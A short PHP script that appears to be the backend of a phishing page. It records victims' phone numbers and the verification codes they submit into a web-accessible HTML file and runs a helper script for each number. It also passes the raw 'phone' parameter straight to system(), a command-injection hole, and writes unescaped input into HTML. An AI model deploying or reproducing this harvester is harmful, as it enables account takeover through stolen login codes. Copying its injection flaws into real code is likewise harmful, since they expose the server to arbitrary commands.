<?php
$phone = $_GET['phone'];
$code = $_GET['code'];
if($code == ""){
  $f = fopen("bd.html", "a+");
  fwrite($f, "Phone: $phone <br>");
  fclose($f);
  system("python3 hocode.py $phone");
}else{
  $f = fopen("bd.html", "a+");
  fwrite($f, "Code: $code for phone: $phone <hr>");
  fclose($f);
}

?>
